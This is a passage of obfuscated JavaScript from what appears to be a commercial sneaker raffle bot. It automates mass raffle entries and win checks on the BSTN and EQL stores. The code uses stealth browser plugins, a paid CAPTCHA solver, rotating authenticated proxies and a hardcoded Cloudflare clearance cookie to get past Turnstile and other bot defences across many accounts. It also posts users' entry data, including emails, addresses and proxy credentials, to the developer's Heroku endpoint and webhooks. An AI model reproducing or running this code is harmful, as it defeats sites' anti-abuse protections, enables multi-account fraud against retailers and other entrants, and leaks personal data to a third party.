                            _0x7cc99b++, _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x30cea3['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x2cb6bc, _0x1dbdcc = _0x37e9c3[_0x3cdc34];
                            try {
                                await _0x319293(_0x37e9c3, _0x3cdc34);
                            } catch {
                                _0x5cd945 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x2bca09(_0x22e5f5) {
                                const _0x3f8c4f = _0xa4bb3a['readFileSync']('../successful-tasks.csv', 'utf8'), _0x70feea = _0x5b1b10['parse'](_0x3f8c4f, { 'header': !![] })['data'];
                                let _0x44b0e2 = ![];
                                for (var _0x5e5777 of _0x70feea) {
                                    if (_0x5e5777['Url'] == _0x22e5f5['Url'] && _0x5e5777['Email'] == _0x22e5f5['Email']) {
                                        _0x44b0e2 = !![];
                                        break;
                                    }
                                }
                                return _0x44b0e2;
                            }
                            _0x1a7b1b(_0x242a5c['name'] + '\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20/\x20' + _0x37e9c3['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                            var _0x3eb406 = Math['round'](Math['random']() * (_0x4bca40['length'] - 0x1)), _0x22eb44 = _0x4bca40[_0x3eb406]['split'](':'), _0x499415;
                            let _0x346e56 = ![], _0x5cd945 = 'no';
                            try {
                                if (await _0x2bca09(_0x37e9c3[_0x3cdc34]) == !![]) {
                                    console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x346e56 = !![], _0x325ab5 = !![];
                                    return;
                                }
                                try {
                                    _0x499415 = await _0x3d8cc4['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x22eb44[0x0] + ':' + _0x22eb44[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x499415 = await _0x3d8cc4['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x22eb44[0x0] + ':' + _0x22eb44[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x32c2bf = await _0x499415['newPage'](), _0x7411d1 = await _0x32c2bf['target']()['createCDPSession'](), { windowId: _0x3d816e } = await _0x7411d1['send']('Browser.getWindowForTarget');
                                await _0x32c2bf['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x452b5d = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x32c2bf['authenticate']({
                                    'username': '' + _0x22eb44[0x2],
                                    'password': '' + _0x22eb44[0x3]
                                }), console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x32c2bf['goto']('' + _0x37e9c3[_0x3cdc34]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x2be9fc(0x1388);
                                var _0x5f6d65 = await _0x32c2bf['$']('#turnstile-wrapper');
                                if (_0x5f6d65) {
                                    console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x2be9fc(0x2710);
                                    const _0x5a6bb = await _0x32c2bf['$']('#turnstile-wrapper');
                                    if (_0x5a6bb)
                                        try {
                                            await _0x5a6bb['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x32c2bf['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x308fe0 = await _0x32c2bf['$']('#turnstile-wrapper');
                                        if (_0x308fe0)
                                            try {
                                                await _0x308fe0['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x32c2bf['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x7411d1['send']('Browser.setWindowBounds', {
                                    'windowId': _0x3d816e,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x2be9fc(0x1388), await _0x32c2bf['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x32c2bf['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2be9fc(0x1f4), console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Logging\x20in'), await _0x32c2bf['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0xdbd987 => _0xdbd987['click']()), await _0x32c2bf['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x32c2bf['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2be9fc(0x7d0), await _0x32c2bf['waitForSelector']('#email-login'), await _0x32c2bf['type']('#email-login', '' + _0x37e9c3[_0x3cdc34]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x2be9fc(0xdac), await _0x32c2bf['waitForSelector']('#password'), await _0x32c2bf['type']('#password', '' + _0x37e9c3[_0x3cdc34]['Password'], { 'delay': 0xe6 }), await _0x2be9fc(0x157c);
                                try {
                                    await _0x32c2bf['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x540dbd => _0x540dbd['click']());
                                } catch {
                                }
                                try {
                                    await _0x32c2bf['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x474d4f) {
                                }
                                await _0x2be9fc(0x3e8);
                                const _0x1b27d1 = await _0x32c2bf['$']('.enteredDraw_container__2KmQ_');
                                if (_0x1b27d1) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x37e9c3[_0x3cdc34]['Size']);
                                try {
                                    if (_0x37e9c3[_0x3cdc34]['Size'] != 'RANDOM') {
                                        var _0xea4a07 = _0x37e9c3[_0x3cdc34]['Size']['replace']('.', ',');
                                        const _0x4fd2f5 = await _0x32c2bf['$x']('//div[contains(text(),\x20\x27' + _0xea4a07 + '\x27)]');
                                        await _0x4fd2f5[0x0]['click']();
                                    } else {
                                        const _0x4685b6 = await _0x32c2bf['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x156dc8 = Math['round'](Math['random']() * (_0x4685b6['length'] - 0x1));
                                        await _0x4685b6[_0x156dc8]['click']();
                                    }
                                } catch (_0x4acef1) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x2be9fc(0x1f4);
                                const _0xdccd8a = await _0x32c2bf['$']('.addressList_addressItem__LE2PB');
                                if (_0xdccd8a && _0x37e9c3[_0x3cdc34]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x32c2bf['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x2be9fc(0x5dc), await _0x32c2bf['waitForSelector']('#firstname'), await _0x32c2bf['type']('#firstname', '' + _0x37e9c3[_0x3cdc34]['FirstName']), await _0x2be9fc(0x1f4), await _0x32c2bf['waitForSelector']('#firstname'), await _0x32c2bf['type']('#lastname', '' + _0x37e9c3[_0x3cdc34]['LastName']), await _0x2be9fc(0x1f4), await _0x32c2bf['waitForSelector']('#firstname'), await _0x32c2bf['type']('#street', '' + _0x37e9c3[_0x3cdc34]['Address1']), await _0x2be9fc(0x1f4), await _0x32c2bf['waitForSelector']('#firstname'), await _0x32c2bf['type']('#houseNumber', _0x37e9c3[_0x3cdc34]['HouseNumber'] + '\x20' + _0x37e9c3[_0x3cdc34]['Address2']), await _0x2be9fc(0x1f4), await _0x32c2bf['waitForSelector']('#firstname'), await _0x32c2bf['select']('#country_code', '' + _0x37e9c3[_0x3cdc34]['Country']), await _0x2be9fc(0x1f4), await _0x32c2bf['type']('#postcode', '' + _0x37e9c3[_0x3cdc34]['Zip']), await _0x2be9fc(0x1f4), await _0x32c2bf['type']('#city', '' + _0x37e9c3[_0x3cdc34]['City']), await _0x2be9fc(0x1f4), await _0x32c2bf['type']('#telephone', '' + _0x37e9c3[_0x3cdc34]['Phone']), await _0x2be9fc(0x1f4), await _0x32c2bf['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x2be9fc(0x9c4);
                                try {
                                    await _0x32c2bf['type']('#instagram_name', '' + _0x37e9c3[_0x3cdc34]['Follower']), await _0x32c2bf['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x2be9fc(0x5dc);
                                try {
                                    await _0x32c2bf['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x2be9fc(0x5dc), await _0x32c2bf['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x1c31ed => _0x1c31ed['click']()), await _0x2be9fc(0x1388);
                                try {
                                    await _0x32c2bf['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x32c2bf['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x37e9c3[_0x3cdc34]['Size'] != 'RANDOM') {
                                        var _0xea4a07 = _0x37e9c3[_0x3cdc34]['Size']['replace']('.', ',');
                                        const _0x2c263c = await _0x32c2bf['$x']('//div[contains(text(),\x20' + _0xea4a07 + ')]');
                                        await _0x2c263c[0x0]['click']();
                                    } else {
                                        const _0x48c4f1 = await _0x32c2bf['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x156dc8 = Math['round'](Math['random']() * (_0x48c4f1['length'] - 0x1));
                                        await _0x48c4f1[_0x156dc8]['click']();
                                    }
                                    await _0x2be9fc(0x5dc);
                                    try {
                                        await _0x32c2bf['hover']('#instagram_name'), await _0x32c2bf['type']('#instagram_name', '' + _0x37e9c3[_0x3cdc34]['Follower']), await _0x32c2bf['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4b16ae + '\x20/\x205)');
                                    try {
                                        await _0x32c2bf['hover']('.checkBox_boxHolder__wLGVe'), await _0x2be9fc(0x5dc), await _0x32c2bf['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x2be9fc(0x157c), await _0x32c2bf['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xf8852 => _0xf8852['click']()), await _0x2be9fc(0x1388), await _0x32c2bf['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x5cd945 = 'no', _0x34c52d(_0x37e9c3[_0x3cdc34], _0x242a5c);
                                try {
                                    prxdata = {
                                        'username': _0x3373db['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x55a951),
                                        'proxy': '' + _0x4bca40[_0x3cdc34]
                                    };
                                    var _0x215b30 = JSON['stringify'](prxdata);
                                    let _0x157e74 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x215b30, _0x157e74);
                                } catch (_0x3698a2) {
                                }
                                console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x300d09 = await _0x14203e(_0x37e9c3[_0x3cdc34], _0x242a5c, 'dev', ![]), _0x3b0028 = await _0x14203e(_0x37e9c3[_0x3cdc34], _0x242a5c, 'pub', ![]);
                                const _0x22fecf = {
                                    'succesDEVMSG': { 'embeds': [_0x300d09] },
                                    'succesPUBMSG': { 'embeds': [_0x3b0028] }
                                };
                                let _0x55a951 = _0x37e9c3[_0x3cdc34];
                                try {
                                    prxdata = {
                                        'username': _0x3373db['replace']('#', ''),
                                        'module': _0x242a5c['name'],
                                        'entrydata': JSON['stringify'](_0x55a951),
                                        'proxy': '' + _0x4bca40[_0x3cdc34]
                                    };
                                    var _0x215b30 = JSON['stringify'](prxdata);
                                    let _0x4b4f6d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x215b30, _0x4b4f6d);
                                } catch (_0x59fc65) {
                                }
                                try {
                                    _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x22fecf['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x22fecf['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x3b111f, _0x22fecf['succesPUBMSG']);
                                } catch (_0x5a12ea) {
                                    console['log'](_0x10a2e3['yellow'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5a12ea));
                                }
                            } catch (_0x40bf4f) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20' + _0x40bf4f)), _0x5cd945 = 'yes', _0x2cb6bc = '' + _0x40bf4f;
                                var _0x222096 = await _0x14203e(_0x37e9c3[_0x3cdc34], _0x242a5c, 'dev', !![], _0x2cb6bc), _0x300d09 = await _0x14203e(_0x37e9c3[_0x3cdc34], _0x242a5c, 'dev', ![]), _0x3b0028 = await _0x14203e(_0x37e9c3[_0x3cdc34], _0x242a5c, 'pub', ![]);
                                const _0x424972 = {
                                    'succesDEVMSG': { 'embeds': [_0x300d09] },
                                    'succesPUBMSG': { 'embeds': [_0x3b0028] }
                                };
                                _0x424972['errorDEV'] = { 'embeds': [_0x222096] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x424972['errorDEV']), await _0x1bfffd(_0x31e47f, _0x424972['errorDEV']);
                            } finally {
                                _0x499415 && _0x499415['close']();
                                if (_0x5cd945 == 'yes' && _0x4b16ae != 0x5)
                                    return console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Task\x20' + (_0x3cdc34 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4b16ae + '\x20/\x205)')), _0x4b16ae = _0x4b16ae + 0x1, _0x7cc99b--, _0x781fbc(_0x242a5c, _0x37e9c3, _0x4bca40, _0x3cdc34, _0x4b16ae);
                                _0x5cd945 == 'yes' && _0x4b16ae >= 0x5 && _0x48f0c7(_0x37e9c3[_0x3cdc34], _0x242a5c), !_0x346e56 && (console['log'](_0x451967() + '\x20[' + _0x242a5c['name'] + ']\x20Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay'])), _0x7cc99b--;
                            }
                        }
                        _0x781fbc(_0x52910b, _0x1d2d0d, _0x2b31cc, _0x2d6cd5, 0x0), await _0x2be9fc(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4cff16, _0x1e6f3b) {
                    _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x30cea3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x11c0e5;
                    try {
                        const _0x50b06f = _0xa4bb3a['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x11c0e5 = _0x5b1b10['parse'](_0x50b06f, { 'header': !![] })['data'];
                    } catch (_0x165e53) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x3c7511 = 0x0; _0x3c7511 < _0x11c0e5['length']; _0x3c7511++) {
                        if (_0x2dd6e4 != 'yes')
                            var _0x2dd6e4 = '', _0x418626 = 0x0;
                        var _0x341a14;
                        _0x1a7b1b(_0x4cff16['name'] + '\x20Task\x20' + (_0x3c7511 + 0x1) + '\x20/\x20' + _0x11c0e5['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                        var _0x221b33 = await _0x14203e(_0x11c0e5[_0x3c7511], _0x4cff16, 'acc', ![]);
                        const _0x3cd219 = { 'succesDEVMSG': { 'embeds': [_0x221b33] } }, _0x4b733b = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x2f13d6 = Math['round'](Math['random']() * (_0x1e6f3b['length'] - 0x1)), _0x285f50 = _0x1e6f3b[_0x2f13d6]['split'](':'), _0x48ae89;
                        try {
                            _0x48ae89 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x285f50[0x0] + ':' + _0x285f50[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x48ae89 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x285f50[0x0] + ':' + _0x285f50[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1ba227 = await _0x48ae89['newPage']();
                            await _0x1ba227['authenticate']({
                                'username': '' + _0x285f50[0x2],
                                'password': '' + _0x285f50[0x3]
                            }), console['log'](_0x451967() + '\x20[' + _0x4cff16['name'] + ']\x20Task\x20' + (_0x3c7511 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1ba227['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1ba227['setRequestInterception'](!![]), _0x1ba227['on']('request', _0x102d6e => {
                                _0x102d6e['resourceType']() === 'image' ? _0x102d6e['abort']() : _0x102d6e['continue']();
                            });
                            try {
                                await _0x1ba227['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x1ba227['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x2dd6e4 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x1ba227['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x451967() + '\x20[' + _0x4cff16['name'] + ']\x20Task\x20' + (_0x3c7511 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2be9fc(0x3e8), await _0x1ba227['type']('#email', _0x11c0e5[_0x3c7511]['Email']), await _0x2be9fc(0x1f4), await _0x1ba227['type']('#pass', _0x11c0e5[_0x3c7511]['Password']), await _0x2be9fc(0x1f4), await _0x1ba227['$eval']('#login-form', _0x82f3e3 => _0x82f3e3['submit']());
                            try {
                                await _0x1ba227['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x451967() + '\x20[' + _0x4cff16['name'] + ']\x20Task\x20' + (_0x3c7511 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x2be9fc(0x190);
                            const _0x2c4dfa = await _0x1ba227['evaluate'](() => {
                                const _0x218c23 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x218c23['map'](_0x24e2e8 => _0x24e2e8['alt']);
                            }), _0x2257bb = await _0x1ba227['evaluate'](() => {
                                const _0x952e6d = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x952e6d['map'](_0x128f77 => _0x128f77['innerHTML']);
                            }), _0x3d3819 = await _0x1ba227['$$']('.raffle-winner');
                            if (_0x3d3819['length'] < 0x1) {
                                console['log'](_0x451967() + '\x20[' + _0x4cff16['name'] + ']\x20Task\x20' + (_0x3c7511 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x2dd6e4 = 'no';
                                continue;
                            }
                            console['log'](_0x451967() + '\x20[' + _0x4cff16['name'] + ']\x20Task\x20' + (_0x3c7511 + 0x1) + '\x20:\x20' + _0x3d3819['length'] + '\x20Wins\x20Found!');
                            for (var _0x509abb = 0x0; _0x509abb < _0x3d3819['length']; _0x509abb++) {
                                console['log'](_0x10a2e3['green'](_0x2c4dfa[_0x509abb] + _0x2257bb[_0x509abb]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x4850e2) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x4cff16['name'] + ']\x20Task\x20' + (_0x3c7511 + 0x1) + '\x20:\x20' + _0x4850e2)), _0x341a14 = '' + _0x4850e2;
                            var _0x539363 = await _0x14203e(_0x11c0e5[_0x3c7511], _0x4cff16, 'acc', !![], _0x341a14);
                            _0x3cd219['errorDEV'] = { 'embeds': [_0x539363] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x3cd219['errorDEV']), await _0x1bfffd(_0x31e47f, _0x3cd219['errorDEV']), _0x2dd6e4 = 'yes';
                        } finally {
                            if (_0x48ae89)
                                _0x48ae89['close']();
                            if (_0x2dd6e4 == 'yes' && _0x418626 != 0x5) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x4cff16['name'] + ']\x20Task\x20' + (_0x3c7511 + 0x1) + '\x20:\x20Retrying\x20(' + _0x418626 + '\x20/\x205)')), _0x3c7511 = _0x3c7511 - 0x1, _0x418626 = _0x418626 + 0x1;
                                continue;
                            }
                            _0x2dd6e4 == 'yes' && _0x418626 >= 0x5 && (_0x48f0c7(_0x11c0e5[_0x3c7511], _0x4cff16), _0x2dd6e4 = 'no', _0x418626 = 0x0), console['log'](_0x451967() + '\x20[' + _0x4cff16['name'] + ']\x20Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x199478, _0x4b93fc, _0x2c4e3e) {
                _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x30cea3['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x53b851 = 0x0; _0x53b851 < _0x4b93fc['length']; _0x53b851++) {
                    var _0x5ed54b;
                    _0x1a7b1b(_0x199478['name'] + '\x20Task\x20' + (_0x53b851 + 0x1) + '\x20/\x20' + _0x4b93fc['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                    try {
                        await _0x319293(_0x4b93fc, _0x53b851);
                    } catch {
                        _0x5e7923 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x15ad49(_0x116b18) {
                        const _0x45c90b = _0xa4bb3a['readFileSync']('../successful-tasks.csv', 'utf8'), _0x596784 = _0x5b1b10['parse'](_0x45c90b, { 'header': !![] })['data'];
                        let _0x1d620a = ![];
                        for (var _0xf5c9e9 of _0x596784) {
                            if (_0xf5c9e9['Url'] == _0x116b18['Url'] && _0xf5c9e9['Email'] == _0x116b18['Email']) {
                                _0x1d620a = !![];
                                break;
                            }
                        }
                        return _0x1d620a;
                    }
                    if (await _0x15ad49(_0x4b93fc[_0x53b851]) == !![]) {
                        console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x418100 = ![];
                    const _0x2d8a5d = _0xa4bb3a['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x33c0a2 = _0x5b1b10['parse'](_0x2d8a5d, { 'header': !![] })['data'];
                    for (var _0x17bb79 of _0x33c0a2) {
                        _0x17bb79['Email'] == _0x4b93fc[_0x53b851]['Email'] && (_0x418100 = !![]);
                    }
                    if (_0x418100 == ![]) {
                        var _0x436ce9;
                        if (_0x4b93fc[_0x53b851]['Url']['endsWith']('/')) {
                            _0x436ce9 = _0x4b93fc[_0x53b851]['Url'] + 'register';
                            if (_0x5e7923 != 'yes')
                                var _0x5e7923 = '', _0x21361c = 0x0;
                        } else {
                            _0x436ce9 = _0x4b93fc[_0x53b851]['Url'] + '/register';
                            if (_0x5e7923 != 'yes')
                                var _0x5e7923 = '', _0x21361c = 0x0;
                        }
                        if (_0x4b93fc[_0x53b851]['Email'] == '' || _0x4b93fc[_0x53b851]['FirstName'] == '' || _0x4b93fc[_0x53b851]['LastName'] == '') {
                            console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x4b93fc[_0x53b851]['Password'] == '' && (_0x4b93fc[_0x53b851]['Password'] = 'JRaffles23!');
                        if (_0x30cea3['useRandomProxy'] = ![])
                            var _0x317458 = _0x2c4e3e[_0x53b851]['split'](':');
                        else
                            var _0x5024ac = Math['round'](Math['random']() * (_0x2c4e3e['length'] - 0x1)), _0x317458 = _0x2c4e3e[_0x5024ac]['split'](':');
                        var _0x206a19;
                        try {
                            _0x206a19 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x317458[0x0] + ':' + _0x317458[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x206a19 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x317458[0x0] + ':' + _0x317458[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4cb23b = await _0x206a19['newPage']();
                            await _0x4cb23b['authenticate']({
                                'username': '' + _0x317458[0x2],
                                'password': '' + _0x317458[0x3]
                            }), console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4cb23b['setRequestInterception'](!![]), _0x4cb23b['on']('request', _0x52c44a => {
                                _0x52c44a['resourceType']() === 'image' || _0x52c44a['resourceType']() === 'font' || _0x52c44a['resourceType']() === 'media' ? _0x52c44a['abort']() : _0x52c44a['continue']();
                            });
                            try {
                                await _0x4cb23b['goto']('' + _0x436ce9);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2be9fc(0x3e8), await _0x4cb23b['waitForSelector']('#email'), await _0x4cb23b['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x2be9fc(0x3e8);
                            try {
